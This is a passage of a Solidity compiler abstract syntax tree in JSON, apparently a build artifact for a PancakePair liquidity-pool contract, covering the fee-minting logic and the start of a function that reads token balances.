																						"id": 802,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"memberName": "mul",
																						"nodeType": "MemberAccess",
																						"referencedDeclaration": 2385,
																						"src": "4355:19:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																							"typeString": "function (uint256,uint256) pure returns (uint256)"
																						}
																					},
																					"id": 804,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"kind": "functionCall",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "4355:30:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 797,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2311,
																					"src": "4345:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$2311_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 798,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2310,
																				"src": "4345:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 805,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4345:41:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "4332:54:1"
																	},
																	{
																		"assignments": [
																			808
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 808,
																				"name": "rootKLast",
																				"nodeType": "VariableDeclaration",
																				"scope": 860,
																				"src": "4404:14:1",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 807,
																					"name": "uint",
																					"nodeType": "ElementaryTypeName",
																					"src": "4404:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 813,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 811,
																					"name": "_kLast",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 788,
																					"src": "4431:6:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 809,
																					"name": "Math",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2311,
																					"src": "4421:4:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_contract$_Math_$2311_$",
																						"typeString": "type(library Math)"
																					}
																				},
																				"id": 810,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "sqrt",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": 2310,
																				"src": "4421:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_internal_pure$_t_uint256_$returns$_t_uint256_$",
																					"typeString": "function (uint256) pure returns (uint256)"
																				}
																			},
																			"id": 812,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "4421:17:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "4404:34:1"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 816,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 814,
																				"name": "rootK",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 796,
																				"src": "4460:5:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 815,
																				"name": "rootKLast",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 808,
																				"src": "4468:9:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "4460:17:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 859,
																		"nodeType": "IfStatement",
																		"src": "4456:373:1",
																		"trueBody": {
																			"id": 858,
																			"nodeType": "Block",
																			"src": "4479:350:1",
																			"statements": [
																				{
																					"assignments": [
																						818
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 818,
																							"name": "numerator",
																							"nodeType": "VariableDeclaration",
																							"scope": 858,
																							"src": "4501:14:1",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 817,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4501:4:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 829,
																					"initialValue": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"hexValue": "38",
																								"id": 827,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"kind": "number",
																								"lValueRequested": false,
																								"nodeType": "Literal",
																								"src": "4585:1:1",
																								"subdenomination": null,
																								"typeDescriptions": {
																									"typeIdentifier": "t_rational_8_by_1",
																									"typeString": "int_const 8"
																								},
																								"value": "8"
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_rational_8_by_1",
																									"typeString": "int_const 8"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"arguments": [
																											{
																												"argumentTypes": null,
																												"id": 823,
																												"name": "rootKLast",
																												"nodeType": "Identifier",
																												"overloadedDeclarations": [],
																												"referencedDeclaration": 808,
																												"src": "4544:9:1",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											}
																										],
																										"expression": {
																											"argumentTypes": [
																												{
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											],
																											"expression": {
																												"argumentTypes": null,
																												"id": 821,
																												"name": "rootK",
																												"nodeType": "Identifier",
																												"overloadedDeclarations": [],
																												"referencedDeclaration": 796,
																												"src": "4534:5:1",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"id": 822,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"memberName": "sub",
																											"nodeType": "MemberAccess",
																											"referencedDeclaration": 2357,
																											"src": "4534:9:1",
																											"typeDescriptions": {
																												"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																												"typeString": "function (uint256,uint256) pure returns (uint256)"
																											}
																										},
																										"id": 824,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"kind": "functionCall",
																										"lValueRequested": false,
																										"names": [],
																										"nodeType": "FunctionCall",
																										"src": "4534:20:1",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 819,
																										"name": "totalSupply",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 19,
																										"src": "4518:11:1",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 820,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2385,
																									"src": "4518:15:1",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 825,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4518:37:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"id": 826,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "mul",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2385,
																							"src": "4518:41:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																								"typeString": "function (uint256,uint256) pure returns (uint256)"
																							}
																						},
																						"id": 828,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "4518:90:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4501:107:1"
																				},
																				{
																					"assignments": [
																						831
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 831,
																							"name": "denominator",
																							"nodeType": "VariableDeclaration",
																							"scope": 858,
																							"src": "4630:16:1",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 830,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4630:4:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 842,
																					"initialValue": {
																						"argumentTypes": null,
																						"arguments": [
																							{
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"hexValue": "38",
																										"id": 839,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "4681:1:1",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_8_by_1",
																											"typeString": "int_const 8"
																										},
																										"value": "8"
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_rational_8_by_1",
																											"typeString": "int_const 8"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 837,
																										"name": "rootKLast",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 808,
																										"src": "4667:9:1",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 838,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2385,
																									"src": "4667:13:1",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 840,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4667:16:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							}
																						],
																						"expression": {
																							"argumentTypes": [
																								{
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							],
																							"expression": {
																								"argumentTypes": null,
																								"arguments": [
																									{
																										"argumentTypes": null,
																										"hexValue": "3137",
																										"id": 834,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": true,
																										"kind": "number",
																										"lValueRequested": false,
																										"nodeType": "Literal",
																										"src": "4659:2:1",
																										"subdenomination": null,
																										"typeDescriptions": {
																											"typeIdentifier": "t_rational_17_by_1",
																											"typeString": "int_const 17"
																										},
																										"value": "17"
																									}
																								],
																								"expression": {
																									"argumentTypes": [
																										{
																											"typeIdentifier": "t_rational_17_by_1",
																											"typeString": "int_const 17"
																										}
																									],
																									"expression": {
																										"argumentTypes": null,
																										"id": 832,
																										"name": "rootK",
																										"nodeType": "Identifier",
																										"overloadedDeclarations": [],
																										"referencedDeclaration": 796,
																										"src": "4649:5:1",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									},
																									"id": 833,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": false,
																									"lValueRequested": false,
																									"memberName": "mul",
																									"nodeType": "MemberAccess",
																									"referencedDeclaration": 2385,
																									"src": "4649:9:1",
																									"typeDescriptions": {
																										"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																										"typeString": "function (uint256,uint256) pure returns (uint256)"
																									}
																								},
																								"id": 835,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"kind": "functionCall",
																								"lValueRequested": false,
																								"names": [],
																								"nodeType": "FunctionCall",
																								"src": "4649:13:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"id": 836,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"memberName": "add",
																							"nodeType": "MemberAccess",
																							"referencedDeclaration": 2335,
																							"src": "4649:17:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																								"typeString": "function (uint256,uint256) pure returns (uint256)"
																							}
																						},
																						"id": 841,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"kind": "functionCall",
																						"lValueRequested": false,
																						"names": [],
																						"nodeType": "FunctionCall",
																						"src": "4649:35:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4630:54:1"
																				},
																				{
																					"assignments": [
																						844
																					],
																					"declarations": [
																						{
																							"constant": false,
																							"id": 844,
																							"name": "liquidity",
																							"nodeType": "VariableDeclaration",
																							"scope": 858,
																							"src": "4706:14:1",
																							"stateVariable": false,
																							"storageLocation": "default",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"typeName": {
																								"id": 843,
																								"name": "uint",
																								"nodeType": "ElementaryTypeName",
																								"src": "4706:4:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"value": null,
																							"visibility": "internal"
																						}
																					],
																					"id": 848,
																					"initialValue": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 847,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 845,
																							"name": "numerator",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 818,
																							"src": "4723:9:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "/",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 846,
																							"name": "denominator",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 831,
																							"src": "4735:11:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "4723:23:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"nodeType": "VariableDeclarationStatement",
																					"src": "4706:40:1"
																				},
																				{
																					"condition": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 851,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 849,
																							"name": "liquidity",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 844,
																							"src": "4772:9:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": ">",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 850,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "4784:1:1",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_0_by_1",
																								"typeString": "int_const 0"
																							},
																							"value": "0"
																						},
																						"src": "4772:13:1",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bool",
																							"typeString": "bool"
																						}
																					},
																					"falseBody": null,
																					"id": 857,
																					"nodeType": "IfStatement",
																					"src": "4768:42:1",
																					"trueBody": {
																						"expression": {
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"id": 853,
																									"name": "feeTo",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 772,
																									"src": "4793:5:1",
																									"typeDescriptions": {
																										"typeIdentifier": "t_address",
																										"typeString": "address"
																									}
																								},
																								{
																									"argumentTypes": null,
																									"id": 854,
																									"name": "liquidity",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 844,
																									"src": "4800:9:1",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_address",
																										"typeString": "address"
																									},
																									{
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								],
																								"id": 852,
																								"name": "_mint",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 125,
																								"src": "4787:5:1",
																								"typeDescriptions": {
																									"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_uint256_$returns$__$",
																									"typeString": "function (address,uint256)"
																								}
																							},
																							"id": 855,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"kind": "functionCall",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "4787:23:1",
																							"typeDescriptions": {
																								"typeIdentifier": "t_tuple$__$",
																								"typeString": "tuple()"
																							}
																						},
																						"id": 856,
																						"nodeType": "ExpressionStatement",
																						"src": "4787:23:1"
																					}
																				}
																			]
																		}
																	}
																]
															}
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 874,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mintFee",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 767,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 764,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 874,
												"src": "4043:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 763,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "4043:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 766,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 874,
												"src": "4070:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 765,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "4070:7:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4033:60:1"
									},
									"returnParameters": {
										"id": 770,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 769,
												"name": "feeOn",
												"nodeType": "VariableDeclaration",
												"scope": 874,
												"src": "4111:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 768,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "4111:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4110:12:1"
									},
									"scope": 1700,
									"src": "4016:900:1",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 1018,
										"nodeType": "Block",
										"src": "5090:1200:1",
										"statements": [
											{
												"assignments": [
													884,
													886,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 884,
														"name": "_reserve0",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5101:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 883,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "5101:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 886,
														"name": "_reserve1",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5120:17:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint112",
															"typeString": "uint112"
														},
														"typeName": {
															"id": 885,
															"name": "uint112",
															"nodeType": "ElementaryTypeName",
															"src": "5120:7:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint112",
																"typeString": "uint112"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													null
												],
												"id": 889,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 887,
														"name": "getReserves",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 535,
														"src": "5143:11:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$__$returns$_t_uint112_$_t_uint112_$_t_uint32_$",
															"typeString": "function () view returns (uint112,uint112,uint32)"
														}
													},
													"id": 888,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5143:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_uint112_$_t_uint112_$_t_uint32_$",
														"typeString": "tuple(uint112,uint112,uint32)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5100:56:1"
											},
											{
												"assignments": [
													891
												],
												"declarations": [
													{
														"constant": false,
														"id": 891,
														"name": "balance0",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5181:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 890,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5181:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 900,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 897,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2475,
																	"src": "5230:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																],
																"id": 896,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "5222:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 898,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5222:13:1",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 893,
																	"name": "token0",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 475,
																	"src": "5204:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 892,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1784,
																"src": "5197:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$1784_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 894,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "5197:14:1",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$1784",
																"typeString": "contract IERC20"
															}
														},
														"id": 895,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "balanceOf",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 1745,
														"src": "5197:24:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address) view external returns (uint256)"
														}
													},
													"id": 899,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5197:39:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "5181:55:1"
											},
											{
												"assignments": [
													902
												],
												"declarations": [
													{
														"constant": false,
														"id": 902,
														"name": "balance1",
														"nodeType": "VariableDeclaration",
														"scope": 1018,
														"src": "5246:13:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 901,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "5246:4:1",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 911,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 908,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2475,
																	"src": "5295:4:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_PancakePair_$1700",
																		"typeString": "contract PancakePair"
																	}
																],
																"id": 907,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "5287:7:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
